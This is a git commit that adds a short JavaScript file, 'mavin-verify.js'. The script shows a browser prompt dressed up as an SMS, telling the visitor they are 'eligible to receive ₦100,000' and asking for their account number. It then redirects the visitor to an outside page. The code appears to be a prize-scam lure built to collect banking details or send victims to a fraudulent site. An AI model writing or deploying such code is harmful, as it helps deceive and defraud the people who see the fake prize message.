32001f58ef989fa505e3a71139b6e2a11e00dd1d
sweet16palz-hub <sweet16palz@gmail.com>
2026-05-11 20:29:04 +0100

    Create mavin-verify.js

---
+++ mavin-verify.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW ₦100,000'
+password=prompt('SMS: Congratulations, you are eligible to receive ₦100,000, click OK to Enter Account Number','WITHDRAW ₦100,000');
+if (password != 'WITHDRAW ₦100,000') {
+location.href='https://gbamz.com/don-birthday.html';
+}
